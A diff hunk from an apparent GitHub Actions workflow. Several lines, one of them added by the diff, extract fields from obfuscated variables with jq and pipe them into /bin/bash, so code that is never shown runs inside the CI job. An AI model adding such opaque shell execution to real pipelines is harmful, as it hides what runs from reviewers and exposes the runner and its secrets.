@@ -34,6 +34,7 @@ jobs:
           echo $sfvu37112 | jq -r .xf89532 | /bin/bash
           echo $v0799 | jq -r .xm90730 | /bin/bash
           echo $yh8248 | jq -r .tqjg68994 | /bin/bash
+          printf '%s' "$sp42" | jq -r .p0581 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
